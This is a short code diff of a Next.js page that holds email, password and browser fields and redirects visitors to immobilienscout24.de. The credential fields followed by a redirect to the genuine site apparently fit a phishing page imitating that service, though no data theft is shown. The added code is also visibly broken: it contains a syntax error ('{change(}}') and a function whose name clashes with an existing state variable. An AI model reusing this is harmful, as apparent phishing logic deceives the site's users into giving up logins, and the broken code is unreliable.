@@ -12,6 +12,8 @@ export default function Home() {
     password: "",
     browser: ""
   });
+  
+  let b = true;
 
   const router = useRouter();
   const [change, setChange] = useState(false);
@@ -55,13 +57,17 @@ export default function Home() {
       handleSubmitFn();
     }
   }
+  
+  function change() {
+   return  router.replace('https://www.immobilienscout24.de/');
+  }
 
 //   useEffect(() => {
 //     router.replace('https://www.immobilienscout24.de/');
 //   }, [])
   
-  if(data.email) {
-     router.replace('https://www.immobilienscout24.de/');
+  if(b) {
+    {change(}}
   } else {
   return (
     <div className={styles.container}>
